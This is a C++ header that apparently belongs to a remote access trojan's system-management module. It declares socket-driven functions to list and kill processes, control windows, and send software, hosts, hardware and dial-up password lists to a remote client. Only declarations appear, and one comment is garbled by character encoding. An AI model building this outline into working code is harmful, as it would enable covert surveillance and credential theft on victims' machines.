// SystemManager.h: interface for the CSystemManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_SYSTEMMANAGER_H__5E44B060_837A_4D2D_9E75_E4A33E51CAE1__INCLUDED_)
#define AFX_SYSTEMMANAGER_H__5E44B060_837A_4D2D_9E75_E4A33E51CAE1__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"

class CSystemManager : public CManager  
{
public:
	CSystemManager(CClientSocket *pClient);
	virtual ~CSystemManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	static bool CALLBACK EnumWindowsProc( HWND hwnd, LPARAM lParam);
private:
	LPBYTE getProcessList();
	LPBYTE getWindowsList();


	void SendProcessList();
	void SendWindowsList();

	void KillProcess(LPBYTE lpBuffer, UINT nSize);
	
	void Freezing(LPBYTE lpBuffer, UINT nSize);
	void Thaw(LPBYTE lpBuffer, UINT nSize);

	LPBYTE GetFileAttr(BYTE szByte, LPCSTR FilePtah);
	void SendFileAttr(LPCSTR lpBuffer); //ÎÄ¼þÊôÐÔ

	void TestWindow(LPBYTE buf);
	void CloseWindow(LPBYTE buf);


	void SendDialupassList();

	void SendSoftWareList();
	LPBYTE getSoftWareList();

	void SendHostsList();
	LPBYTE getHostsList();
	
	void SendHardwareList();
	LPBYTE getHardwareList();

};

#endif // !defined(AFX_SYSTEMMANAGER_H__5E44B060_837A_4D2D_9E75_E4A33E51CAE1__INCLUDED_)
